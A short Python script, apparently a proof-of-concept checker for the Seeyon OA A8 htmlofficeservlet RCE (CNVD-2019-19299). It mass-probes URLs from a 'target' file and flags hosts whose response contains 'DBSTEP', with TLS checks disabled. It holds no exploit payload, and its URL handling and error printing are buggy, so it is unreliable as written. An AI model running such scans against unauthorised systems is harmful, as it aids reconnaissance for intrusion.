# -*- coding: UTF-8 -*-
# author : Firbasky
import requests
import json
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
#解决https ssl问题

"""
漏洞介绍
致远 OA A8 htmlofficeservlet RCE漏洞 CNVD-2019-19299
远程攻击者在无需登录的情况下可通过向 URL /seeyon/htmlofficeservlet POST 精心构造的数据即可向目标服务器写入任意文件，写入成功后可执行任意系统命令进而控制目标服务器。

影响版本
致远A8-V5协同管理软件V6.1sp1
致远A8+协同管理软件V7.0、V7.0sp1、V7.0sp2、V7.0sp3
致远A8+协同管理软件V7.1
"""



def POC_1(target_url):
    vuln_url = target_url + "/seeyon/htmlofficeservlet"
    try:
        response = requests.post(url=vuln_url, verify=False, timeout=5)
        if "DBSTEP" in response.text:
          print("\033[31m可能存在漏洞:{}\033[0m".format(vuln_url))
        else:
          print("\033[30;1m安全:{}\033[0m".format(vuln_url))
    except Exception as e:
        print("[x] 目标请求失败")

def Scan(file_name):
    with open(file_name, "r", encoding='utf8') as scan_url:
        for url in scan_url:
            if url[:5] != "https":
                url = "http://" + url
            url = url.strip('\n')
            try:
                POC_1(url)
            except Exception as e:
                print("请求报错:{e}".format(e))
                continue

if __name__ == '__main__':
    file_name  = str(input("\033[35mPlease input Attack File\nFile >>> \033[0m"))
    Scan(file_name)

